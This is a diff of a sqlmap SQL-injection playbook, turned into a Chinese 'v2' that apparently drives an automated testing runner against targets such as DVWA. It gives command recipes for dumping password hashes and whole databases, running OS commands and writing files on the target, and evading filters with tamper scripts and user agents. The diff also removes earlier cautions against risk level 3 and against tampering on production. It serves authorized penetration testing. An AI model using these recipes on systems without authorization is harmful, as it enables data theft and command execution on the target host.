@@ -1,33 +1,42 @@
-# sqlmap playbook (staged)
+# sqlmap playbook（v2 全 stage）
 
-## Stage map
+## Stage ↔ flag 对应
 
-| Stage | sqlmap flag | Purpose | Stop and report |
+| Stage | sqlmap flag | 作用 | job 额外字段 |
 |---|---|---|---|
-| detect | (none) | injectable? technique, DBMS, columns | yes |
-| tables | `--tables` | table names | yes |
-| columns | `-T <table> --columns` | columns of one table | yes |
-| dump | `-T <table> -C <cols> --dump` | selected data | yes |
-| dbs / current-db | `--dbs` / `--current-db` | database names | optional |
+| detect | （无枚举 flag） | injectable? 技术/DBMS/列数 | — |
+| dbs | `--dbs` | 列所有库 | — |
+| current-db | `--current-db` | 当前库名 | — |
+| tables | `--tables` | 当前库全部表 | — |
+| columns | `-T <table> --columns` | 某表列名 | `table` |
+| dump | `-T <table> [-C <cols>] --dump` | 取数 | `table`，`columns` 推荐 |
+| dump-all | `--dump-all` | 全库导出 | —（量大） |
+| passwords | `--passwords` | 拖口令哈希 | — |
+| privileges | `--privileges` | 当前用户权限 | — |
+| sql-query | `--sql-query="<语句>"` | 单发 SQL | `query` |
+| os-cmd | `--os-cmd="<命令>"` | 单发系统命令 | `cmd` |
+| file-read | `--file-read="<路径>"` | 读目标文件 | `file_read` |
+| file-write | `--file-write="<本地源>" --file-dest="<目标路径>"` | 写文件 | `file_write` + `file_dest` |
 
-Use one `--output-dir` for the whole engagement; only `detect` uses `--flush-session`.
-Reset with `--flush-session` only when you intentionally want a fresh detection.
+规则：一个 engagement 用一个 `--output_dir`；只有 `detect` 带 `--flush-session`（复用注入点缓存）；要重置缓存就显式重跑 detect。
 
-## Request recipes
+**交互式 shell**：`--os-shell` / `--sql-shell` 与 `--batch` 不兼容，运行器不支持。要交互 shell：先 `--dry-run` 抄出完整命令，用户自己在终端里跑（去掉 `--batch`）。
 
-### GET with query parameter
+## 请求配方
+
+### GET 查询参数
 
 ```
 -u "http://host/path?keyword=1*&from=&to=" --cookie "NB_SID=..."
 ```
 
-### POST form
+### POST 表单
 
 ```
--u "http://host/login" --data "username=1*&password=x" --cookie "..."
+-u "http://host/vulnerabilities/sqli/" --data "id=1*&Submit=Submit" --cookie "..."
 ```
 
-sqlmap treats `--data` as POST. Add `--method POST` only if the site requires it explicitly.
+`--data` 即 POST；仅当站点强制时才加 `--method POST`。
 
 ### POST JSON
 
@@ -39,44 +48,48 @@ X-CSRF-Token: <token>" \
   --cookie "NB_SID=..."
 ```
 
-- Put `*` inside the JSON string value.
-- A valid base value (e.g. `WELCOME10`) is required for AND boolean tests; an empty base makes true/false both empty and produces a false negative.
-- If the JSON payload needs a double quote, escape it as `\"`.
+- `*` 放 JSON 字符串值内部。
+- 布尔类测试需要合法基线值（如 `WELCOME10`）；空基线会让真/假响应都为空 → 假阴性。
+- JSON 里要双引号时转义为 `\"`。
 
-## Core flags
+## 核心参数
 
-- `--batch` non-interactive; `--threads 1` always.
-- `--level 1–3` more payloads; `--risk 1–2` more intrusive tests (never 3 here).
-- `--dbms` skips fingerprinting when known.
-- `--delay N` seconds between requests; use 1–3 on rate-limited targets.
-- `--time-sec 5` time-based blind wait; keep 3–10.
-- `--technique` B/E/U/S/T when you need to force a technique.
-- `--union-cols` / `--union-char` when UNION needs help; a non-numeric `--union-char` can avoid reflective-value false negatives.
-- `--string` a marker that appears only in the "true" response (boolean blind).
-- `--output-dir` artifact root; CSV dumps land under `<out>/<host>/dump/<db>/`.
+- `--batch` 非交互；threads 由 job 控制（私网档案可 1–10，公网建议 1）。
+- `--level 1–5`：payload 广度；`--risk 1–3`：侵入度（3 含 OR 类改数语句，dump/共享库慎用）。
+- `--user-agent "<串>"`：UA 有 UA 规则的目标必配浏览器串（DVWA 靶机实测：非浏览器 UA 全站 403；浏览器 UA 放行）。job 字段 `user_agent`，档案预填。
+- `--dbms` 已知库类型就写（省指纹）。
+- `--delay N` 请求间隔秒；公网/限速目标 1–3。
+- `--time-sec 3–10` 时延注入等待。
+- `--technique B/E/U/S/T` 强制技术：B 布尔、E 报错、U UNION、S 栈查、T 时延。
+- `--union-cols N` / `--union-char X`：UNION 列数与占位符（非数字 char 可避免回显假阴性）。
+- `--string "<标记>"`：布尔盲注时"真"响应独有的标记。
+- `--tamper a,b,c`：payload 变形脚本串。DVWA medium 常用 `space2comment`；`between` 替换比较符；组合用逗号。tamper 是 job 级字段，作用于所有 stage。
+- `--output-dir`：产物根；CSV 落 `<out>/<host>/dump/<db>/`。
 
-## Reading results
+## 结果解读
 
-- `is vulnerable` → injectable. `Type:` / `Title:` / `Payload:` → technique and evidence.
-- `appears to have N columns` → UNION column count.
-- `back-end DBMS:` → DBMS.
-- `retrieved:` rows during `--tables` / `--dump`.
-- `dumped to CSV file '...'` → artifact path.
-- `fetched data logged to text files under '...'` → log directory.
+- `is vulnerable` / `might be injectable` → 可注入；`does not seem to be injectable` → 不可注入。
+- `Type:` / `Title:` / `Payload:` → 技术与证据（milestone 会原样摘出）。
+- `back-end DBMS:` → 库类型。
+- `appears to have N columns` → UNION 列数。
+- `retrieved: '...'` → tables/columns/dump 过程行。
+- `dumped to CSV file '...'` → CSV 产物路径。
+- `fetched data logged to text files under '...'` → 日志目录。
+- `passwords` 阶段输出哈希行（如 `$2y$...` / `5f4dcc...`）：把哈希串交给 hashcat；**模式号自己查 hashcat 文档，不要问 AI**。
 
-## Failure triage
+## 失败分诊
 
-- **302 → /login / 401** — cookie expired or wrong host. Re-copy Cookie; redo the baseline.
-- **403 / Cloudflare challenge** — WAF, not "no vuln". Stop. Ask the owner to allowlist or give a staging URL. Do not spray `--tamper`/`--random-agent` on production.
-- **429** — rate limit. Increase `--delay`, lower scope, wait. Never parallelize.
-- **All 200, "not injectable"** — baseline empty, wrong parameter, or encoding/CSRF issue. Verify with a normal value and inspect the actual request.
-- **500 burst + blank dump** — the app may cap input length or swallow SQL errors. Check its max length; use shorter manual payloads or ask the owner.
-- **UNION false negative** — column count or reflected values; try `--union-cols N --union-char 1` or a distinctive string; `--string` for boolean.
-- **Time-based unreliable** — increase `--time-sec`; avoid on slow/shared links.
+- **302 → /login / 401** — Cookie 过期或错主机。重跑会话脚本/重取 Cookie，重跑基线。
+- **403（尤其整站统一 403）** — 先排除 UA 规则：job 加浏览器 `user_agent` 重试；仍 403 才是 WAF/Cloudflare。停；问用户对策（加白/staging）。
+- **429** — 限速。加 `delay`、缩范围、等窗口；公网别并发。
+- **全 200 但 not injectable** — 基线空、参数错、编码/CSRF 问题。用有数据的值复核，检查 `*` 位置，`level` 提 3。
+- **500 连发 + dump 空** — 应用可能截断输入或吞错误。换短载荷，问用户上限。
+- **UNION 假阴性** — 列数/回显位没对上。`--union-cols N`、换 `--union-char`；布尔用 `--string`。
+- **时延不稳** — 链路慢/共享。调 `--time-sec`（3–10），或换技术。
 
-## Artifacts and report
+## 产物与报告
 
-- Raw logs: `<output_dir>/<stage>.log`.
-- Dumps: `<output_dir>/<host>/dump/<db>/<table>.csv`.
-- Final report: target/scope, entry, request, technique/payloads, data exposed, fix, artifacts, not-tested.
-- Mask cookies, CSRF tokens, phone numbers, emails, and any personal data.
+- 日志：`<output_dir>/<stage>.log`（运行器自动落盘）。
+- 数据：`<output_dir>/<host>/dump/<db>/<table>.csv`。
+- milestone：`STAGE / STATUS / EVIDENCE / DBMS / TABLES / ARTIFACTS / LOG / EXIT`，逐 stage 报。
+- 终报要素：目标与范围、入口、请求形态、技术与 payload、暴露数据、修法、产物路径、未测项。Cookie/CSRF/个人数据掩码。
